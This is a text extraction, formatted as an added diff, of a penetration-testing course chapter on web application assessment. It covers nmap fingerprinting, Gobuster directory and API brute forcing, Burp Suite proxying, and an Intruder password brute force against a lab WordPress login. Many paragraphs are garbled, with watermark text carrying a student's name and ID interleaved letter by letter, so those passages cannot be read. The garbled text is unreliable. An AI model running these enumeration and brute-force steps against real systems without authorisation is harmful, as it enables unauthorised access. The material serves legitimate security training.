@@ -1,0 +1,1580 @@
+                                                                                           Penetration Testing with Kali Linux
+
+8 Introduction to Web Application Attacks
+
+In this Learning Module, we will cover the following Learning Units:
+· Web Application Assessment Methodology
+· Web Application Enumeration
+· Cross-Site Scripting
+
+In this Module, we'll begin introducing web application attacks. Modern frameworks and hosting
+services simplify the process of building and deploying web applications. However, these
+applications expose a large attack surface due to multiple dependencies, insecure configurations,
+immature codebases, and business-specific flaws.
+
+Web applications are written using a variety of programming languages and frameworks, each of
+which can introduce specific types of vulnerabilities. Since common vulnerabilities are
+conceptually similar and frameworks behave similarly regardless of the underlying technology
+stack, we'll be able to follow similar exploitation avenues.
+
+8.1 Web application assessment methodology
+
+This Learning Unit covers the following Learning Objectives:
+
+· Understand web application security testing requirements
+
+·  Learn     various types and  mToepth1o0doanlodgmiesosfot rcwomebmWhaoiptnpllwoicweabtiovunlnteesrtainbgilities
+·  Learn     about the OWASP
+
+Before we    begin discussing     meneutmhoedroaltoiogniJeesaf.nfrdeyexploitation,  let's  examine                 the  different  web
+application  penetration testing
+
+sWdAoeshupirteaecn-edbpoicenxongdetoeetrsn,attttihnhioegenidtnyeftpresaescstroetibrfru,eincswftuoserrcemeOcnSiata-atnr5iroei7osn7asi5dsp2isern1oes9wvs0oishdniec,adah,nwwtdheeeibthssacadvopeeppseulii,gncancanotddinoostnchtureaumeisnneienngdgtaaagttceihocmrnee.esenBstedtrociufaftleuehrsseee.nattphpimslicetaythtpiooednos'sf,
+
+testing gives us a more comprehensive view of the application, it requires a specific skill set to
+
+find vulnerabilities in source code. The skills required for white-box testing include source code
+
+and application logic review, among others. This testing methodology might take more time,
+
+relative to the size of the codebase being reviewed.
+
+Alternatively, black-box testing (also known as a zero-knowledge test) provides no information
+about the target application, meaning it's essential for the tester to invest significant resources
+into the enumeration stage. This approach is typical in bug bounty engagements.
+
+      Info
+     Grey-box testing occurs whenever we are provided with limited information on the
+     target's scope, including authentication methods, credentials, or details about the
+     framework.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                           217
+                                                                          Penetration Testing with Kali Linux
+
+This Module focuses on black-box testing to build the web application skills covered in this
+course.
+
+In this and the following Modules, we will explore web application vulnerability enumeration and
+exploitation. Although the complexity of vulnerabilities and attacks varies, we'll demonstrate
+exploiting several common web application vulnerabilities in the OWASP Top 10 list.
+
+The OWASP Foundation aims to improve global software security and, as part of this goal, they
+develop the OWASP Top 10, a periodically compiled list of the most critical security risks to web
+applications.
+
+Understanding these attack vectors will serve as the basic building blocks to construct more
+advanced attacks, as we'll learn in other Modules.
+
+8.2 Web application assessment tools
+
+This Learning Unit covers the following Learning Objectives:
+· Perform common enumeration techniques on web applications
+· Understand web proxies theory
+· Learn how Burp Suite proxy works for web application testing
+
+Before going into the details of web application enumeration, let's familiarize ourselves with the
+
+tools of the trade. In this Learning Unit, we are going to revisit Nmap for web services
+
+enumeration, along with Wappalyzer, an online service that discloses the technology stack behind
+
+an application, and Gobuster, a   Stouoitlefoprropexyrf,owrmhiicnhgwdWierh'elilctrtleoolrywyoanndhefialevidlyisfcoorvwereyb.                                                                  application    testing
+Finally, we'll focus on the Burp
+
+during  this and upcoming  Modules.     wJeitfhfreNymap
+
+8.2.1   Fingerprinting     web servers
+
+scAtosamrctomwvoeenrbeddaeipnnpoalmicpianrteaiovtoinorueosnfuMamnoyedrwuaOleetSib,-oN5na7mp7fp5rao2lpi1mc9ais0tiittoshnectgohoraet-teocxotpomoospleofsonreitnisnti,stietahrlveaiccwetsiev.be  enumeration.   We should
+                                                                                                                                                                                              server, since  this is the
+
+Since we found port 80 open on our target, we can proceed with service discovery. To get started,
+
+we'll rely on the nmap service scan (-sV) to identify the web server (-p80) banner.
+
+kali@kali:~$ <cu>sudo nmap -p80 -sV 192.168.50.20</cu>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 05:13 EDT
+Nmap scan report for 192.168.50.20
+Host is up (0.11s latency).
+
+PORT STATE SERVICE VERSION
+80/tcp open http <cr>Apache httpd 2.4.41 ((Ubuntu))</cr>
+
+                                     Listing 113 - Running Nmap scan to discover web server version
+
+Our scan shows that Apache version 2.4.41 is running on the Ubuntu host.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                     218
+                                                                          Penetration Testing with Kali Linux
+
+To take our enumeration further, we can use service-specific Nmap NSE scripts, like http-enum,
+which performs an initial fingerprinting of the web server.
+
+kali@kali:~$ <cu>sudo nmap -p80 --script=http-enum 192.168.50.20</cu>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT
+Nmap scan report for 192.168.50.20
+Host is up (0.10s latency).
+
+PORT STATE SERVICE
+80/tcp open http
+| http-enum:
+| /login.php: Possible admin folder
+| /db/: BlogWorx Database
+| /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+| /db/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+| /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+| /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+|_ /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41
+(ubuntu)'
+
+Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
+                              Listing 114 - Running Nmap NSE http enumeration script against the target
+
+As shown above, we discovered several interesting folders that could lead to further details about
+the target web application.
+
+By using Nmap scripts, we managed to discover more application-specific information that we
+can add to the web server enumeration we performed earlier.
+
+AaO8ln.wo2cnee.ga2lwtwhTietoehfchtihnahefvnoearomcrltoeaivgtgeiiosyintnesfaroetbradomcuaatkttiohifdrneeeagenpapttahilcifecciracointauigontJntiweo,tfeenfwcrpeheweynrficotoWalhohrnmigWtyepldsoeatwrvapfiocapkrmaNvlmiayazaWpeTa,repwcpehacnlyaoznleorag. lysoLpoaosksuipveloynfettchhe
+                         OS-57752190
+megacorpone.com domain.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                 219
+                                                                          Penetration Testing with Kali Linux
+
+             Whitlow
+
+             Figure 82J:eWfafprpeaylyzer findings
+
+This quick   e-sfxetihntveidesrirnnacaglalsvnaunblanaeleslyrovasabilspuilraitrobieOevlvSseide-.5ead7las7ti5nai2nf,o1fa9orsm0rmsaoatimtoionenvaeabrbosoiuoutnt sJthaoevfaJOSaScv,raiUpStIcrfliripbatrmalirbeiwerasorirekus,sewadreebbknyseorwtvhneert, owanbebde
+more. The
+application
+affected by
+
+8.2.3 Directory brute force with Gobuster
+
+Once we have discovered an application running on a web server, our next step is to map all its
+publicly accessible files and directories. To do this, we would need to perform multiple queries
+against the target to discover any hidden paths. Gobuster is a tool (written in Go language) that
+can help us with this sort of enumeration. It uses wordlists to discover directories and files on a
+server through brute forcing.
+
+      Caution
+     Due to its brute forcing nature, Gobuster may be noisy and unsuitable for stealth
+     engagements.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  220
+                                                                          Penetration Testing with Kali Linux
+
+Gobuster supports various enumeration modes, including fuzzing and DNS, but for now, we'll
+focus solely on the dir mode, which enumerates files and directories. We need to specify the
+target IP using the -u parameter and a wordlist with -w. The default running threads are 10; we
+can reduce the amount of traffic by setting a lower number via the -t parameter.
+
+kali@kali:~$ <cu>gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt
+
+-t 5</cu>
+
+===============================================================
+
+Gobuster v3.1.0
+
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+
+===============================================================
+
+[+] Url:         http://192.168.50.20
+
+[+] Method:      GET
+
+[+] Threads:     5
+
+[+] Wordlist:    /usr/share/wordlists/dirb/common.txt
+
+[+] Negative Status codes: 404
+
+[+] User Agent:  gobuster/3.1.0
+
+[+] Timeout:     10s
+
+===============================================================
+
+2022/03/30 05:16:21 Starting gobuster in directory enumeration mode
+
+===============================================================
+
+/.hta            (Status: 403) [Size: 278]
+
+/.htaccess       (Status: 403) [Size: 278]
+
+/.htpasswd       (Status: 403) [Size: 278]
+
+/css             (Status: 301) [Size: 312] [--> http://192.168.50.20/css/]
+
+/db              (Status: 301) [Size: 311] [--> http://192.168.50.20/db/]
+
+/images          (Status: 301) [Size: 315] [--> http://192.168.50.20/images/]
+
+/index.php       (Status: 302) [Size: 0] [--> ./login.php]
+
+/js              (Status: 301) [Size: 311] [--> http://192.168.50.20/js/]
+
+=2//=u=s0==e2p=2=rl==v=/o0==ea=3r=d-=s/=s3==t0==a==t==0u5==s=:===1=8===:0==8======F==i(=(n=SSi==t==tsaah==tte==u=d=us==s::====43==00==L31==is))==ti==n[==[gSS==1i==i1Jzz==5eee==f-::==fR==ru2==3en71==yn8=6=in]]==Wg==hGi=[=ot==-bl==-uo==>sw==te==hr==t==t==p==:==/==/==1==9==2.168.50.20/uploads/]
+
+4tUe0nn3d)er.erHstoohuwerec/veuessr.r,/tFshoheuarrreemo/wfaotinhridenslgisetssOrixe/Sd-sa5iorr7beu7/ra5c2cfeo1cs9led0saesrreibwlieneaascnecdleedscestesibdelervthedeufuecrotthmoermininosvunef.tfsxitctiigewantotiordpnrl.iisvtil,ewgehsich(Sftoautunsd:
+
+8.2.4 Security testing with Burp Suite
+
+Burp Suite is a GUI-based integrated platform for web application security testing. It provides
+several different tools via the same user interface.
+
+While the free Community Edition mainly contains tools used for manual testing, the commercial
+versions include additional features, including a formidable web application vulnerability scanner.
+Burp Suite has an extensive feature list and is worth investigating, but we will only explore a few
+basic functions in this section.
+
+An important feature of Burp Suite is the ability to intercept HTTPS traffic. This requires using the
+Burp certificate, which is beyond the scope of this discussion.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                              221
+                                                                                                                              Penetration Testing with Kali Linux
+
+We can find Burp Suite Community Edition in Kali under Applications > 03 Web Application
+Analysis > burpsuite.
+
+                                     Figure 83: Starting Burp Suite
+
+We can also launch it from the command  line  with  bWuhriptsluoitwe:
+
+kali@kali:~$ <cu>burpsuite</cu>
+
+After  our  initial  launch,  we'll  Lfiisrstint gn1o1t6ic-eStaarwtinagJreBnfuinfrprgeStyuhitaetfrBomurap  terminal shell  been  tested  on  our  Java
+
+                                                                                                           Suite has not
+
+Runtime  wEinthvirtohnemOeSn, tw(eJcRaEn).sSaOifnSec-ly5e7ig7thn5e2o1rK9e0athliistewaamrnainlwg.ays      tests  Burp  Suite  on  the  Java   version
+shipped
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                          222
+                                                                                           Penetration Testing with Kali Linux
+
+                                                        Figure 84: Burp Suite JRE warning
+
+Once it launches, we'll choose Temporary project and click Next.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                               Figure 85: Burp Startup
+
+We'll leave Use Burp defaults selected and click Start Burp.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                   223
+                                                                          Penetration Testing with Kali Linux
+
+Figure 86: Burp Configuration
+
+After a few moments, the UI will load.           Whitlow
+
+                                        Jeffrey
+
+OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  224
+                                                                                                        Penetration Testing with Kali Linux
+
+                            Figure 87: Burp Suite User Interface
+
+The initial  four panes of  Itnhseteiandte, rwfaecearpergimoianrgilytoseforvcWeuhsaitsolnaowtshuemfemaaturyrefsorprtehseePnrtoovnetrhseiotnabsscainnntheer,
+so we can    ignore them.
+upper bar.
+                       inPtreorxcyepttoorel.qIunesgtesnaenradlJ/eotferfrmrreessy,poanwseesb
+Let's start with  the                                                                         proxy is  any dedicated   hardware or
+software meant    to                                                                         between    the web client  and the web
+stheervpeSrroo. xmTInyhef,iobswoaetlhblompwrsaonxauideamsllyainraiesntedrmaatpuoOSltroos-y5mae7nda7d5tti2oct1ea9isnl0ltytee. rrsceaplitkecotmo mpaondyi-fwy iadneyTrLeSquterasftfsict.hKant oawreninatserTcLeSpted by
+
+inspection devices, these perform decryption and re-encryption of the traffic and thus
+
+nullify any privacy layer provided by the HTTPS protocol.
+
+With the Burp Proxy tool, we can intercept any request sent from the browser before it is passed
+on to the server. We can change almost anything about the request at this point, such as
+parameter names or form values. We can even add new headers. This lets us test how an
+application handles unexpected arbitrary input. For example, an input field might have a size limit
+of 20 characters, but we could use Burp Suite to modify a request to submit 30 characters.
+
+To set up a proxy, we will first click the Proxy tab to reveal several sub-tabs. We'll also disable the
+Intercept tool, found under the Intercept tab.
+
+      Tip
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                225
+                                                                                                                      Penetration Testing with Kali Linux
+
+When Intercept is enabled, we have to manually click on Forward to send each request to
+its destination. Alternatively, we can click Drop to not send the request. There are times
+when we will want to intercept traffic and modify it, but when we are just browsing a site,
+having to click Forward on each request is very tedious.
+
+Next,  we  can  review  the  proxy      Figure  88: Turning  OTWfhfhiIenttleOrocwpetpitons  sub-tab  shows  what  ports  are
+
+                                    listener    settings.
+
+listening for proxy requests.                   Jeffrey
+
+                               OS-57752190
+
+                                                              Figure 89: Proxy Listeners
+
+By default, Burp Suite enables a proxy listener on localhost:8080. This is the host and port that
+our browser must connect to in order to proxy traffic through Burp Suite.
+
+      Info
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                 226
+                                                                                                                              Penetration Testing with Kali Linux
+
+     Burp Suite is now shipped with its own Chromium-based native web browser, which is
+     preconfigured to work with all Burp's features. However, for this course we are going to
+     exclusively rely on Kali's Firefox browser because it is a more flexible and modular
+     option.
+
+Let's walk through configuring the Firefox browser on our local Kali machine to use Burp Suite as
+a proxy.
+
+In Firefox, we can do this by navigating to about:preferences#general, scrolling down to Network
+Settings, then clicking Settings.
+
+Let's choose the Manual option, setting the appropriate IP address and listening port. In our case,
+the proxy (Burp) and the browser reside on the same host, so we'll use the loopback IP address
+127.0.0.1 and specify port 8080.
+
+      Info
+     In some testing scenarios, we might want to capture the traffic from multiple machines,
+     so the proxy will be configured on a standalone IP. In such cases, we will configure the
+     browser with the external IP address of the proxy.
+
+Finally, we also want to enable this proxy server for all protocol options to ensure that we can
+intercept every request while testing the target application.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  227
+                                                                                                                                        Penetration Testing with Kali Linux
+
+Whitlow
+
+Figure 90: FirJeefofxfrPeroyxy Configuration.
+
+WubnroidthwersBePurrtopoxycho>tntpHfi:Tg//TuwrPewHdwisa.mtsoreayg.parcooOxrSyp-o5o7nn7e5o.c2uo1r9mb0.roWwesesrh, owueldcafinndclothsee  any extra open Firefox tabs and
+                                                                                                                                        intercepted traffic in Burp Suite
+
+                                                        Figure 91: Burp Suite HTTP History
+
+We can now review the various requests our browser performed towards our target website.
+      Warning
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                228
+                                                                                                                              Penetration Testing with Kali Linux
+
+     If the browser hangs while loading the page, Intercept may be enabled. Switching it off
+     will allow the traffic to flow uninterrupted. As we browse to additional pages, we should
+     observe more requests in the HTTP History tab.
+
+By clicking on one of the requests, the entire dump of client requests and server responses is
+shown in the lower half of the Burp UI.
+
+                                     Figure 92: Inspecting the fiWrshtiHtTlTowP request.
+paOlanonntehg.ewWlietitfhht tphtahenisreepswopewoncesarfenu.lvWiBseuu'lralplmizfeaekatethueuresc,eliweonfettJhcreeaifsqnfufreieenayssttupdreeectotafeitlseve,nwrdyiutdhrientthgaeiul spoecfrovemearcinrhegsrMepqooundesuseletosp.nertfhoermrigehdt,
+
+     AWbrcohaywTpdistpeoiveethspe"odIrnetatteel crinstpeaot.wrIttaeibls.fpioraefOtfgSeo-enx5t.7dch7ioas5mtp2s1l"a9eky0reevdeepswashhseoanwsaioncrcgteuoppftigninagtteahweuapsyerorpxaaygghreeiswetmohreeynn?taottrempting to
+     authenticating through a browser to a Wi-Fi network.
+     To ignore this, simply enter about:config in the address bar. Firefox will present a
+     warning, but we can proceed by clicking I accept the risk!.
+     Finally, search for "network.captive-portal-service.enabled" and double-click it to change
+     the value to "false". This will prevent these messages from appearing in the proxy
+     history.
+
+Besides the Proxy feature, the Repeater is another fundamental Burp tool. With the Repeater, we
+can craft new requests or easily modify the ones in History, resend them, and review the
+responses. To observe this in action, we can right-click a request from Proxy > HTTP History and
+select Send to Repeater.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  229
+                                                                          Penetration Testing with Kali Linux
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                    Figure 93: Sending a Request to Repeater
+
+If we click on Repeater, we will observe one sub-tab with the request on the left side of the
+window. We can send multiple requests to Repeater, and it will display them using separate tabs.
+Let's send the request to the server by clicking Send.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  230
+                                                                          Penetration Testing with Kali Linux
+
+                                                           Figure 94: Burp Suite Repeater
+
+Burp Suite will display the raw server response on the right side of the window, which includes the
+response headers and un-rendered response content.
+
+                         Whitlow
+               Jeffrey
+OS-57752190
+
+                                         Figure 95: Burp Suite Repeater with Request and Response
+
+The last feature we will cover is Intruder. First, we'll need to configure our local Kali's /etc/hosts
+file to statically assign the IP to the offsecwp website we are going to test.
+
+      Info
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  231
+                                                                                                                              Penetration Testing with Kali Linux
+
+     Some web applications will include their hostname in links and redirects. If we don't
+     have an entry in /etc/hosts that matches the web application's hostname, our browser
+     and other tools may not be able to follow these links.
+
+This allows us to access the VM by hostname while bypassing DNS.
+
+kali@kali:~$ <cu>cat /etc/hosts</cu>
+...
+192.168.50.16 offsecwp
+
+                                           Listing 117 - Setting up our /etc/hosts file for offsecwp
+
+The Intruder Burp feature, as its name suggests, is designed to automate a variety of attack
+angles, from the simplest to more complex web application attacks. To learn more about this
+feature, let's simulate a password brute forcing attack.
+
+Since we are dealing with a new target, we can start a new Burp session and configure the Proxy
+as we did before. Next, we'll navigate to http://offsecwp/wp-login.php from Firefox. Then, we will
+type "admin" and "test" as respective username and password values, and click Log in.
+
+                         Whitlow
+               Jeffrey
+OS-57752190
+
+                                                 Figure 96: Simulating a failed WordPress login
+
+Returning to Burp, we'll navigate to Proxy > HTTP History, right-click on the POST request to /wp-
+login.php and select Send to Intruder.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  232
+                                                                          Penetration Testing with Kali Linux
+
+                                    Figure 97: Sending the POSTWrheiqtuleoswt to Intruder
+
+aWfonredccematnohveneoptwaosstsheweleocPrtdotshfiiteeioldInn.stFrusirdusebtr,-twtaabeb'.lliKnpnrtoehwsesiunCpgJpleetefharfarrbtoeatynhr,etchhueosreoigrsheatdtmbheainrPsiOsoSctToharrreteqacultl,efwsietelwdosenalwyraennecteletdoatrmoedob.drWuiftyee,
+can then select the value of theOpS-w5d77k5e2y19a0nd press the Add button on the right.
+
+Figure 98: Assigning the password value to the Intruder payload generator
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.   233
+                                                                                                                              Penetration Testing with Kali Linux
+
+We have now instructed the Intruder to modify only the password value on each new request.
+Before starting our attack, let's provide Intruder with a wordlist. Knowing that the correct
+password is "password", we can grab the first 10 values from the rockyou wordlist on Kali.
+
+kali@kali:~$ <cu>cat /usr/share/wordlists/rockyou.txt | head</cu>
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+
+                                          Listing 118 - Copying the first 10 rockyou wordlist values
+
+Moving to the Payloads sub-tab, we can paste the above wordlist into the Payload Options: [Simple
+list] area.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  234
+                                                                          Penetration Testing with Kali Linux
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                 Figure 99: Pasting the first 10 rockyou entries
+
+With everything ready to start the Intruder attack, let's click on the top right Start Attack button.
+
+We can move past the Burp warning about restricted Intruder features, as this won't impact our
+attack. After we let the attack complete, we can observe that apart from the initial probing
+request, it performed 10 requests, one for each entry in the provided wordlist.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  235
+                                                                          Penetration Testing with Kali Linux
+
+                                                 Figure 100: Inspecting Intruder's attack results
+
+We'll notice that the WordPress application replied with a different Status code on the 4th request,
+hinting that this might be the correct password value. Our hypothesis is confirmed once we try to
+log in to the WordPress administrative console with the discovered password.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                          Figure 101: Logging to the WP admin console
+
+ Caution
+If we set Firefox to use Burp as a proxy, and we close Burp, Firefox won't work correctly.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                    236
+                                                                          Penetration Testing with Kali Linux
+
+Now that we've built a solid foundational knowledge about how Burp and other assessment tools
+work, let's take the next step and learn how to enumerate a target web application.
+
+8.3 Web application enumeration
+
+This Learning Unit covers the following Learning Objectives:
+· Learn how to debug web application source code
+· Understand how to enumerate and inspect headers, cookies, and source code
+· Learn how to conduct API testing methodologies
+
+In a previous Module, we learned how passive information gathering can play a critical role when
+mapping web applications, especially when public repositories or Google dorks disclose sensitive
+information about our target. Whether working with leaked credentials or mere application
+documentation, we should always refer to the information retrieved during active testing.
+Referring back to passive findings can uncover unexplored paths.
+
+It is important to identify the components that make up a web application before attempting to
+blindly exploit it. Many web application vulnerabilities are technology-agnostic. However, some
+exploits and payloads need to be crafted based on the technological underpinnings of the
+application, such as the database software or operating system. Before launching any attacks on
+a web application, we should first attempt to discover the technology stack in use. Technology
+stacks generally consist of a host operating system, web server software, database software, and
+a frontend/backend programming language.
+
+Once  we  have enumerated the underlying  stack  usinWghitthleowmethodologies  we  learned  earlier,  we'll
+move  on  to application enumeration.
+
+WmoedcAtueaasrsrnnegItnfbheluefretolvoafnewopraraspmoeglircueesarismtipnieoucpvnrlelupi.erdoasesl,etadesletchbvheoenOlcuoiSaqgp-uuhe5se7rDes7te5ottv2hooe1elsl9ygo0tapohteJfhafreetefTrrcfoiartnohenflyiossarsaminsreaifsotttiryomipnniactahtabieolloyneunutdustirhemedeceitbrnlayyntdeiforeronvwmepolrorotkphcieenergssbss,r.toohwfeosyuearrr.eMost
+We will be focusing on Firefox since it is the default browser in Kali Linux. However, most
+
+browsers include similar tools.
+
+8.3.1 Debugging page content
+
+A good place to start our web application information mapping is with a URL address. File
+extensions, which are sometimes part of a URL, can reveal the programming language the
+application was written in. Some extensions, like .php, are straightforward, but others are more
+cryptic and vary based on the frameworks in use. For example, a Java-based web application
+might use .jsp, .do, or .html.
+
+File extensions on web pages are becoming less common; however, since many languages and
+frameworks now support the concept of routes, which allow developers to map a URI to a section
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                              237
+                                                                                                                              Penetration Testing with Kali Linux
+
+of code. Applications leveraging routes use logic to determine what content is returned to the
+user, making URI extensions largely irrelevant.
+
+Although URL inspection can provide some clues about the target web application, most context
+clues can be found in the source of the web page. The Firefox Debugger tool (found in the Web
+Developer menu) displays the page's resources and content, which varies by application. The
+Debugger tool may display JavaScript frameworks, hidden input fields, comments, client-side
+controls within HTML, JavaScript, and much more.
+
+Let's test this out by opening Debugger while browsing the offsecwp app:
+
+                Whitlow
+
+       Jeffrey
+
+We'll  nthoeticdeevthealotptehremaipnFpiifgliuiecrdea1tti0ho2Oen:SUc-uso5sin7deg7es5D,2emj1Qv9eau0lokepirneyrgTvioetormlssiotoonrIen3scp.6oec.m0t ,JpaaavcacStocamrinpmdt SocoonurncJseasevrvaiSncgrirpetsoliburracreys.,  In this
+case,                                                                                                                                                                                                                      which
+
+also makes it somewhat difficult to read. Fortunately, we can "prettify" code within Firefox by
+
+clicking on the Pretty print source button with the double curly braces:
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                   238
+                                                                          Penetration Testing with Kali Linux
+
+                                                           Figure 103: Pretty Print Source
+
+After clicking the icon, Firefox will display the code in a format that is easier to read and follow:
+
+Whitlow
+
+Figure 104: ViewiJnegfPfrreettyified Source in Firefox
+
+seWexeaamrccahinnefiaetllshdoeousnestaehretchhpeainIgnpesu,ptaeencldteomsreOetloSen-oct5ltf7itrn7oog5md2I1rni9tlshl0pdeeocWwt.onrdinPtoresspsehcoifmiceppaaggeecobnytsecnrto. lLlientg's,  use Inspector to
+                                                                                                                                                                                           right-clicking the
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                   239
+                                                                          Penetration Testing with Kali Linux
+
+This will open the Inspector toolFaignudreh1i0g5h:lSigehletcttihngeEH-mTWaMhiliILntplfuootwrEtlehmeeenltement we right-clicked on.
+                                                    Jeffrey
+
+                                     OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                            240
+                                                                                                                              Penetration Testing with Kali Linux
+
+                                                       Figure 106: Using the Inspector Tool
+
+This tool can be especially useful for quickly finding hidden form fields in the HTML source.
+
+Now that we have some familiarity with how to use the built-in browser debugger, we'll learn how
+to use the Network Tool and Burp Proxy to inspect HTTP response headers.
+
+8.3.2 Inspecting HTTP response headers and sitemaps
+
+We can also search server responses for additional information. There are two types of tools we
+can use to accomplish this task. The first type is a proxy, like Burp Suite, which intercepts
+requests and responses between a client and a web server, and the other is the browser's own
+Network tool.
+
+We will explore both approaches in this Module, but let's begin by demonstrating the Network
+tool. We can launch it from the Firefox Web Developer menu to review HTTP requests and
+responses. This tool shows network activity that occurs after it launches, so we must refresh the
+page to display traffic.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                            Figure 107: Using the Network Tool to View Requests
+
+Clicking a request reveals additional details--in this case, we're interested in the response
+headers. Response headers are a subset of HTTP headers that are sent in response to an HTTP
+request.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  241
+                                                                          Penetration Testing with Kali Linux
+
+                                        Figure 108: Viewing Response Headers in the Network Tool
+
+ITnhme Saneryvdeer fhaeualtdceor ndfisigpularayteiodnasb, oitvaelswoilrleovfeteanlsrtehveeavel arWshtiioletnlaosnwtutmhebenra. me of the web server software.
+RHFisCto6poHr6rriToi4cgTa8xTinPilelinypasho,l ewachalceiddetaieenvdprteesrlIryePasciranaetdshtneedasorrttetttsshahtselaew. ruXatOseyS-eFd-so5ogw7rfwe7i"nt5Xah2er-1d"r"9aeiXn0tde-"-fdJFaewovsfroeofhrrrleeeeolyayfcdabaeylclreltetdhoaernsewiogrennnb-aaslsmtatehnirnevdgeawrcr.edoFbnoHvsrTeeinnrTvstPeitoarnhna.ecbaeod,uewtretshb. eHowever,
+
+The names or values in the response header often reveal additional information about the
+technology stack used by the application. Some examples of non-standard headers include X-
+Powered-By, x-amz-cf-id, and X-Aspnet-Version. Further research into these names could reveal
+additional information, such as that the "x-amz-cf-id" header indicates the application uses
+Amazon CloudFront.
+
+Sitemaps are another important element we should take into consideration when enumerating
+web applications.
+
+Web applications can include sitemap files to help search engine bots crawl and index their sites.
+These files also include directives of which URLs not to crawl - typically sensitive pages or
+administrative consoles, which are exactly the sort of pages we are interested in.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  242
+                                                                                                                                                        Penetration Testing with Kali Linux
+
+Inclusive directives are performed with the sitemaps protocol, while robots.txt excludes URLs
+from being crawled.
+
+For example, we can retrieve the robots.txt file from www.google.com with curl:
+
+kali@kali:~$ <cu>curl https://www.google.com/robots.txt</cu>
+User-agent: *
+Disallow: /search
+Allow: /search/about
+Allow: /search/static
+Allow: /search/howsearchworks
+Disallow: /sdch
+Disallow: /groups
+Disallow: /index.html?
+Disallow: /?
+Allow: /?hl=
+...
+
+                                               Listing 119 - https://www.google.com/robots.txt
+
+Allow and Disallow directives inform "polite" web crawlers which pages or directories may be
+accessed or should be avoided. In most cases, the listed pages and directories may not be
+interesting, and some may even be invalid. Nevertheless, sitemap files should not be overlooked
+because they may contain clues about the website layout or other interesting information, such
+as yet-unexplored portions of the target.
+
+8.3.3 Enumerating and abusing APIs
+
+In many cases,   woauintrhupmtehnbeeetbrraoacftikoA-npepnteldicsaltottgiaoircngePatrnoidsgrapanrmoivnmitdeinirnWngghaIinlaltytlesobrowfualiicldte, cbslao(AcskPebId)o.-snToehueorscfeefuAwnPecIbstioaanpresplritecosapttihooennswtihbealbet
+is shipped with
+for interacting      AaPutIhneanmticeadtioRne.presentatJieofnfarleSy tate
+application.
+
+A specific type of                                                         Transfer  (REST)                                                             is  used  for  a  variety            of
+purposes, including
+ftInhuellaytatmyrgpaeipcta'stlhAewPhaIittoteau-crbskoexslvuterefssa.tces.cHeOnoSa-wr5ie7ov7, e5wr2,1ew90wheonuldperrefocermiveingcoambplalectke-bAoPxI
+                                                                                                                                                        documentation to help us
+                                                                                                                                                        test, we'll need to discover
+
+We can use Gobuster features to brute force the API endpoints. In this test scenario, our API
+gateway web server is listening on port 5001 on 192.168.50.16, so we can attempt a directory
+brute force attack.
+
+API paths are often followed by a version number, resulting in a pattern such as:
+
+/api_name/v1
+
+                     Listing 120 - API Path Naming Convention
+
+The API name is often quite descriptive about the feature or data it uses to operate, followed
+directly by the version number.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                           243
+                                                                                         Penetration Testing with Kali Linux
+
+With this information, let's try brute forcing the API paths using a wordlist along with the pattern
+Gobuster feature. We can call this feature by using the -p option and providing a file with patterns.
+For our test, we'll create a simple pattern file on our Kali system containing the following text:
+
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+
+                                   Listing 121 - Gobuster pattern
+
